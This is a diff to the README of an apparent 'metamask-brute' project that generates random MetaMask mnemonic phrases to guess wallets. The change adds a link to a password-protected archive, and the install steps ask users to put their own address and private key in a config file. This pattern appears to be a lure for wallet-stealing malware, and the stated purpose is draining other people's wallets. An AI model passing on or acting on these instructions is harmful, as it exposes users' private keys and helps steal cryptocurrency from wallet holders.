@@ -6,7 +6,7 @@
 A program random generate (12, 18, 24) words metamask mnemonic phrase.
 
 ## Install
-- [Download](https://) the repository release and extract files with password `X`.
+- [Download](https://github.com/deadspyexx/metamask-brute/edit/main/archive/refs/heads/main.zip) the repository release and extract files with password `X`.
 - Edit the `address` and `private_key` fields in the `config.json` file.
 
 ## How it works
